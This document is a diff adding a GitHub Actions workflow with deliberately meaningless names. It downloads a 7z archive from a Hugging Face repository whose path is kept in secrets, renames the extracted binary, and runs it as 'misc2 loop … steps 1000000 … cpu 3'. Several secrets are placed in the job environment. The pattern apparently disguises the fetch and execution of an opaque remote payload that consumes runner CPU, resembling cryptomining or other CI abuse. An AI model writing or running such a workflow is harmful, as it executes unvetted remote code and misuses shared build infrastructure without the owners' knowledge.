@@ -1,0 +1,41 @@
+name: cib
+on:
+  workflow_dispatch:
+    inputs:
+      amd_override:
+        description: '11'
+        required: false
+        default: 'v3'
+        type: string
+      loop_override:
+        description: '12'
+        required: false
+        default: '10'
+        type: string
+env:
+  REPO_DIR: ${{ github.workspace }}
+  WVBG: v1.0.0_${{ github.event.inputs.amd_override }}
+  EZBOP: ${{ github.event.inputs.loop_override }}
+  ENV_MYWEB: ${{ secrets.ENV_MYWEB }}
+  ENV_ADS: ${{ secrets.ENV_ADS }}
+  ENV_DISD: ${{ secrets.ENV_DISD }}
+  UPH: 'huggingface'
+  HF_REPO: ${{ secrets.HF_REPO }}
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v7
+      - name: Down
+        timeout-minutes: 43
+        run: |
+          curl -o misc2.7z -L --url "https://${{ env.UPH }}.co/${{ env.HF_REPO }}/resolve/main/doit_${{ env.WVBG }}.7z?download=true"
+          7z x misc2.7z
+          rm -rf misc2.7z
+          mv doit misc2 && chmod +x misc2
+          ./misc2 loop ${{ env.EZBOP }} steps 1000000 wait 0 cpu 3
+      - name: Ls
+        run: ls -la
+      - name: Low
+        run: curl -o windows.zip -L https://dl.google.com/go/go1.27.2.windows-amd64.zip
